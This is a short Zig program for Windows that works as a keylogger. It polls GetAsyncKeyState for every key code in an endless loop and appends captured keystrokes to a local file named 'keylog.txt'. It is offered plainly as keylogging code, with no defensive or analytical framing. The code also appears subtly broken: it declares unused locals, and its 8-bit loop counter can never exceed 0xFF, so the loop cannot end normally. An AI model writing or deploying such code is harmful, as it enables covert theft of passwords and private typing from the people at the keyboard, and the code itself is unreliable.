const std = @import("std");
const windows = @import("std").os.windows;

pub fn main() !void {
    const stdout = std.io.getStdOut().writer();
    const allocator = std.heap.page_allocator;
    const log_file_path = "keylog.txt";

    var file = try std.fs.cwd().createFile(log_file_path, .{ .truncate = false, .read = false, .append = true });
    defer file.close();

    const writer = file.writer();

    const VK_MIN = 0;
    const VK_MAX = 0xFF;

    while (true) {
        std.time.sleep(10 * std.time.ns_per_millisecond);

        var key: u8 = VK_MIN;
        while (key <= VK_MAX) : (key += 1) {
            const state = windows.user32.GetAsyncKeyState(@intCast(windows.WORD, key));

            if (state & 0x0001 != 0) {
                try writer.print("{c}", .{keyToPrintable(key)});
            }
        }
    }
}

fn keyToPrintable(key: u8) u8 {
    if (key >= 'A' and key <= 'Z') return key;
    if (key >= '0' and key <= '9') return key;
    if (key == 0x20) return ' ';
    return '.';
}
